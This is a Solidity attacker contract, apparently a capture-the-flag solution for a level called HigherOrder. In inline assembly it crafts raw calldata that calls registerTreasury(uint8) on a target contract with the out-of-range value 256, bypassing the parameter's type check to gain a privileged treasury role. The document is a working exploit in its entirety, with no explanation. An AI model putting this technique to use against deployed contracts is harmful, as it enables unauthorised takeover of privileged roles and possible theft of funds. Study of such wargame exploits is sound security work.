pragma solidity 0.6.12;

contract HigherOrderFinalAttacker {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function exploit() external {
        bytes4 funcSig = 0x2548ce37; // registerTreasury(uint8) selector
        assembly {
            // Load target from storage slot 0
            let targetAddress := sload(0)
            // Allocate 36 bytes
            let payload := mload(0x40)
            mstore(0x40, add(payload, 0x24))
            // Store selector and payload
            mstore(payload, funcSig)
            mstore(add(payload, 4), 0x0000000000000000000000000000000000000000000000000000000000000100)
            // Call the function
            let success := call(gas(), targetAddress, 0, payload, 0x24, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
    }
}
